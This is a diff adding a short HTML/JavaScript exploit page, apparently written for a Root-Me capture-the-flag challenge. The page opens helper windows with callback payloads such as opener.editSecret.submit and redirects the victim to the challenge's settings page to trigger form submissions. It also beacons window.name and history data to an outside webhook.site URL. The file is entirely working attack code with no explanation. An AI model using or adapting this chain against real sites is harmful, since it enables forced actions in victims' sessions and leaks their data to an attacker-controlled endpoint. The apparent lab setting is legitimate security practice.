@@ -1,0 +1,18 @@
+<!doctype html><meta charset=utf8><title>c</title><script>
+const WH='https://webhook.site/ca7d4ed4-7642-47ad-98ea-a6f1d402216f';
+const CH='http://challenge01.root-me.org:58010';
+const b=m=>fetch(WH+'?m='+encodeURIComponent(m)+'&t='+Date.now()).catch(()=>{});
+const st=+sessionStorage.stage||0;const n=Date.now();
+if(st==0){
+  sessionStorage.stage=1;b('A1 s1');
+  window.open('c.html?g=opener.history.back%3Fz%3D1&d=1000&n='+n,'c1'+n);
+  window.open('c.html?g=opener.editSecret.submit&d=1800&n='+n,'c2'+n);
+  setTimeout(()=>{b('A1 nav CH');location=CH+'/settings';},300);
+}else if(st==1){
+  sessionStorage.stage=2;
+  b('PONG eval+history OK name='+window.name+' len'+history.length);
+  setTimeout(()=>{location=CH+'/settings?edit=editUsername.submit';},400);
+}else{
+  b('A1 s3 name='+window.name);
+}
+</script>
